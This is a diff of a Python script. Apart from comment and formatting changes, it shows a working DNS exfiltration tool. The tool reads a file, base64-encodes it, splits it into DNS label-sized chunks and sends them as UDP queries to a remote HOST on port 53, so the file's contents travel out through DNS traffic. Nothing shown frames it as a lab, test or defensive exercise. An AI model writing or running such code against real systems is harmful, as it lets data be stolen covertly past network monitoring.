@@ -12,7 +12,7 @@ def get_dns_header(transaction_id: int) -> bytes:
     """
     Build standard DNS header with given transaction ID
     """
-    # 2 Bytes: Transaction ID. Just set to 1, we don't care
+    # 2 Bytes: Transaction ID.
     transaction_id = transaction_id.to_bytes(2, byteorder='big')
 
     # 2 Bytes: Flags. Just use standard headers.
@@ -41,21 +41,21 @@ def send_payloads(payloads: list) -> None:
         header_count = 1
 
         for payload in payloads:
+            # build dns request
             body = get_dns_header(header_count)
             body += payload
-            #print(body)
 
+            # send dns request
             s.sendto(body, (HOST,53))
 
+            # increase header_count
             header_count += 1
         print('SUCCESS')
         return
     print('FAILED')
 
 # read file
-    
 query_raw = None
-
 with open(sys.argv[1],"r") as f:
     query_raw = f.read()
 
@@ -63,17 +63,18 @@ assert query_raw != None, "Could not read file"
 
 # split payload into several queries, each query having upto 250 bytes
 query_raw = query_raw.encode('utf-8')
-#query_raw += b"\xff\xff"
-query_b64 = b64encode(query_raw) + b"\xff\xff"
-#print(query_b64)
 
-#query_raw += b"\xff\xff"
+# Encode as base64 and add stop bytes
+query_b64 = b64encode(query_raw) + b"\xff\xff"
+
 all_payloads = []
 
+# calculate required dns queries for payload
 count_queries = len(query_b64) // 250
 if len(query_b64) % 250 != 0:
     count_queries += 1
 
+# split into several dns queries
 queries = []
 for i in range(count_queries):
     queries.append(query_b64[(i*250):((i+1)*250)])
@@ -87,13 +88,15 @@ for query in queries:
     query_parts = b""
     for i in range(count_query_parts):
         encoded = query[(i*63):((i+1)*63)]
+
         # append len(query) + query + 0 byte to payload
         query_parts += ((len(encoded)).to_bytes(1, byteorder='big') + encoded)
-    # append 0 byte to end string
+
+    # append 0 byte to end string as well as 01 01
     query_parts += b"\x00\x00\x01\x00\x01"
 
     # append request payload to all_payloads
     all_payloads.append(query_parts)
 
-
+# send all payloads
 send_payloads(all_payloads)
